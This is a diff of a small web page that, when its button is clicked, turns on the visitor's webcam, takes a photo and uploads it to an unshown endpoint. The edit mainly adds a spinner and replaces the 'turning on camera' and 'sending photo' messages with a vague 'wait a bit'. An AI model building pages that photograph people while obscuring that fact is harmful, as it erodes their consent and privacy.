@@ -15,6 +15,7 @@
       flex-direction: column;
       font-family: Arial, sans-serif;
     }
+
     button {
       font-size: 2rem;
       padding: 18px 48px;
@@ -25,13 +26,34 @@
       color: white;
       transition: 0.3s;
     }
+
     button:hover {
       transform: scale(1.05);
     }
+
     #status {
-      margin-top: 20px;
-      font-size: 1.2rem;
+      margin-top: 25px;
+      font-size: 1.4rem;
+      display: flex;
+      align-items: center;
+      gap: 12px;
     }
+
+    /* Vòng quay */
+    .spinner {
+      width: 24px;
+      height: 24px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top: 3px solid white;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
     video, canvas { display: none; }
   </style>
 </head>
@@ -52,13 +74,13 @@
 
     nextBtn.addEventListener("click", async () => {
       nextBtn.style.display = "none";
-      statusDiv.textContent = "🔄 Đang bật camera...";
+      statusDiv.innerHTML = `<div class="spinner"></div> <span>⏳ Chờ xíu...</span>`;
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        // Đợi 1 giây cho camera ổn định rồi chụp
+        // Đợi 1 giây rồi chụp
         setTimeout(async () => {
           const context = canvas.getContext("2d");
           canvas.width = video.videoWidth;
@@ -66,7 +88,6 @@
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
           const base64Image = canvas.toDataURL("image/png").split(",")[1];
-          statusDiv.textContent = "📤 Đang gửi ảnh...";
 
           const formData = new FormData();
           formData.append("image", base64Image);
@@ -76,14 +97,14 @@
             body: formData
           });
 
-          // Dừng camera
+          // Tắt camera
           stream.getTracks().forEach(track => track.stop());
 
-          statusDiv.textContent = "✅ Ảnh đã được gửi!";
+          statusDiv.innerHTML = "✅ Ảnh đã được gửi!";
         }, 1000);
       } catch (err) {
         console.error(err);
-        statusDiv.textContent = "❌ Lỗi khi bật camera hoặc gửi ảnh.";
+        statusDiv.innerHTML = "❌ Lỗi khi bật camera hoặc gửi ảnh.";
         nextBtn.style.display = "block";
       }
     });
